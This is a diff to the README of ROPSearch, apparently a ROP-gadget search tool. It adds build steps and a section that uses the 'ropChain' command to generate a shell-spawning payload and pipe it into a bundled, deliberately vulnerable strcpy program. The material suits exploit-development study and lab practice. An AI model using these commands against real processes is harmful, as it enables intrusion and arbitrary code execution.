@@ -9,6 +9,15 @@ It makes use of the great [Capstone disassembler](https://github.com/capstone-en
 ![Main help](resources/help.png)
 
 
+# Building
+
+After installing the dependencies, you need to run
+
+`make -j22 all`
+
+in order to build the project.
+
+
 # "list" command
 
 List all instruction sequences found in the given source.
@@ -35,6 +44,15 @@ It can be obtained running a command similar to the following, assuming that a s
 Otherwise, you can obtain it directly from an executable file:
 
 `bin/ROPSearch.exe ropChain -exec /usr/lib32/libc.so.6 --base-address eb3b0000 --buffer-length 100 -t shellNullNull --max-variants 5 --script-file resources/sampleRopChain.py --no-null`
+
+## ROP-chain for spawning a shell
+
+You can use the "ropChain" command to automatically generate and pass the payload to a vulnerable process, spawning a shell. For example, you can try running these commands:
+- `mkfifo bin/mypipe`
+- `(cat ./bin/mypipe ; cat) | ./bin/vulnerable32bit.exe vulnerable_strcpy`
+
+And then, in another terminal:
+- `bin/ROPSearch.exe ropChain -pid $(pidof vulnerable32bit.exe) --type shellEmptyEmpty --buffer-length 100 --no-null --payload-file bin/mypipe`
 
 
 # "findData" command
